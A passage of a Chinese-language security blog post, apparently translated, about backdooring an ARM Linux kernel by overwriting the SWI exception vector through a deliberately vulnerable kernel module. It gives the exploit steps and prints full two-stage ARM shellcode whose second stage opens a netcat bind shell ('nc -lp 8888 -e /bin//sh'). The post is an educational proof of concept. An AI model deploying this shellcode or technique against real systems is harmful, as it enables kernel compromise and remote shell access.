len);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>就像前面的例子一样，这个模块有一个很棒的功能，可以让你将数据写到你想要的任何地方。 在端口tcp / 9999上连接，并给它一个地址，将后面跟着数据的大小和实际数据写在那里。<br>在这种情况下，我们还会通过覆盖SWI异常向量并对内核进行后门来获取内核后门。 代码将执行到我们的shellcode，我们也将像前一个例子那样存储0xffff020。在这个远程场景中重写SWI向量尤其是一个好主意，因为它可以让我们从中断上下文切换到进程上下文。<br>因此，我们的后门将在支持进程的上下文中执行，并“劫持”这个进程并用绑定shell或连接返回shell来覆盖它的代码段。 但我们不会这样做。 让我们快速检查一下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134740-ef4130ac-7b5f-1.png" alt="19773484.png"></p>
+<p>你可以看到，EVT是一个共享内存段。 它可以从用户空间执行并从内核空间写入*。不要覆盖正在进行系统调用的进程的代码段，而只需在我们的第一阶段之后将代码存储在EVT中，然后返回即可。 每个系统调用都通过SWI向量，所以我们不必等待一个进程陷入陷阱。</p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>利用步骤：</p>
+<ol>
+<li>将我们的第一阶段和第二阶段shellcode存储在0xffff0020（一个接一个）。</li>
+<li>用分支覆盖SWI异常向量0xffff0020。</li>
+<li>发生系统调用时，我们的第一阶段shellcode会将链接寄存器设置为我们第二阶段shellcode的地址（它也存储在EVT中，并将从用户空间执行），然后返回到用户空间。</li>
+<li>调用进程将在我们第二阶段的地址“恢复执行”，这只是一个绑定shell。</li>
+</ol>
+<p>下面是第一、二阶段shellcode:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">stage_1:</span><br><span class="line">    adr lr, stage_2</span><br><span class="line">    push &#123;lr&#125;</span><br><span class="line">    stmfd sp!, &#123;r0-r12&#125;</span><br><span class="line">    ldr r0, =0xe59ff410 ; intial value at 0xffff0008 which is</span><br><span class="line">                                ; ldr pc, [pc, #1040] ; 0xffff0420</span><br><span class="line">    ldr r1, =0xffff0008</span><br><span class="line">    str r0, [r1]</span><br><span class="line">    ldmfd sp!, &#123;r0-r12, pc&#125;^ ; return to userland</span><br><span class="line"></span><br><span class="line">stage_2:</span><br><span class="line">    ldr r0, =0x6e69622f ; /bin</span><br><span class="line">    ldr r1, =0x68732f2f ; /sh</span><br><span class="line">    eor r2, r2, r2 ; 0x00000000</span><br><span class="line">    push &#123;r0, r1, r2&#125;</span><br><span class="line">    mov r0, sp</span><br><span class="line"></span><br><span class="line">    ldr r4, =0x0000632d ; -c\x00\x00</span><br><span class="line">    push &#123;r4&#125;</span><br><span class="line">    mov r4, sp</span><br><span class="line"></span><br><span class="line">    ldr r5, =0x2d20636e</span><br><span class="line">    ldr r6, =0x3820706c</span><br><span class="line">    ldr r7, =0x20383838 ; nc -lp 8888 -e /bin//sh</span><br><span class="line">    ldr r8, =0x2f20652d</span><br><span class="line">    ldr r9, =0x2f6e6962</span><br><span class="line">    ldr r10, =0x68732f2f</span><br><span class="line"></span><br><span class="line">    eor r11, r11, r11</span><br><span class="line">    push &#123;r5-r11&#125;</span><br><span class="line">    mov r5, sp</span><br><span class="line">    push &#123;r2&#125;</span><br><span class="line"></span><br><span class="line">    eor r6, r6, r6</span><br><span class="line">    push &#123;r0,r4,r5, r6&#125;</span><br><span class="line">    mov r1, sp</span><br><span class="line">    mov r7, #11</span><br><span class="line">    swi 0x0</span><br><span class="line"></span><br><span class="line">    mov r0, #99</span><br><span class="line">    mov r7, #1</span><br><span class="line">    swi 0x0</span><br></pre></td></tr></table></figure></p>
+<p>您可以在<a href="https://github.com/acama/arm-evt/tree/master/remote_example" target="_blank" rel="noopener">这里</a>找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134740-ef57fba2-7b5f-1.png" alt="20089125.png"></p>
+<h1 id="奖励：中断堆栈溢出"><a href="#奖励：中断堆栈溢出" class="headerlink" title="奖励：中断堆栈溢出"></a>奖励：中断堆栈溢出</h1><p>在大多数内存布局中，中断堆栈似乎与EVT相邻。谁知道如果有堆栈溢出之类的事情会发生什么样的有趣事情？</p>
+<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><ul>
+<li>本文中讨论的技术假设攻击已经知道内核地址，而这可能并非总是如此。</li>
+<li>我们存储shellcode（0xffff0020）的位置可能会或可能不会被其他发行版的内核使用。</li>
+<li>我在这里写的实验代码仅仅是PoC; 他们肯定可以改进。 例如，在远程方案中，如果事实证明init进程是被劫持的进程，则在我们退出绑定shell之后，该方框会崩溃。</li>
+<li>如果您没有注意到，这里提到的“漏洞”并不是真正的漏洞，但这不是本文的重点。</li>
+</ul>
+<p>*EVT似乎可以映射为只读，因此可能无法在较新/某些版本的Linux内核中写入。</p>
+<h1 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h1><p>除此之外，<a href="http://grsecurity.net/" target="_blank" rel="noopener">grsec</a>通过设置页面为只读来防止修改EVT。 如果你想玩一些有趣的内核挑战，请查看<a href="http://w3challs.com/challenges/wargame" target="_blank" rel="noopener">w3challs</a>上的“kernelpanic”分支。<br>Cheers，<a href="https://twitter.com/amatcama" target="_blank" rel="noopener">@amatcama</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf" target="_blank" rel="noopener">Vector Rewrite Attack</a><br>[2] <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=3292" target="_blank" rel="noopener">Recent ARM Security Improvements</a><br>[3] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html" target="_blank" rel="noopener">Entering an Exception</a><br>[4] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html" target="_blank" rel="noopener">SWI handlers</a><br>[5] <a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf" target="_blank" rel="noopener">ARM Exceptions</a><br>[6] <a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf" target="_blank" rel="noopener">Exception and Interrupt Handling in ARM</a></p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">GETAGGT IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/ARM/">ARM</a> <a class="tag tag--primary tag--small t-link" href="/tags/kernel/">kernel</a> <a class="tag tag--primary tag--small t-link" href="/tags/linux/">linux</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/pwn题的搭建/" data-tooltip="pwn题的搭建" aria-label="FRÜHER: pwn题的搭建">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/Android逆向工具/" data-tooltip="Android逆向工具：非通常方法" aria-label="NÄCHSTER: Android逆向工具：非通常方法">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Inhaltsverzeichnis">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Edvison. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/pwn题的搭建/" data-tooltip="pwn题的搭建" aria-label="FRÜHER: pwn题的搭建">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/Android逆向工具/" data-tooltip="Android逆向工具：非通常方法" aria-label="NÄCHSTER: Android逆向工具：非通常方法">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/ARM异常向量表攻击/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Inhaltsverzeichnis">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+    <i id="btn-close-shareoptions" class="fa fa-close"></i>
+    <ul class="share-options">
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/ARM异常向量表攻击/">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i><span>Teilen auf Facebook</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/ARM异常向量表攻击/">
+                    <i class="fa fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/ARM异常向量表攻击/">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
+                </a>
+            </li>
+        
+    </ul>
+</div>
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+        
+            <h4 id="about-card-name">Edvison</h4>
+        
+            <div id="about-card-bio"><p>Just the way you are</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>二进制、逆向</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover-v1.2.0.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/thumbs.js"></script>
+<script src="/assets/js/tranquilpeak.js"></script>
+<!--SCRIPTS END-->
+
+    
+
+
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true}});</script></body>
+</html>
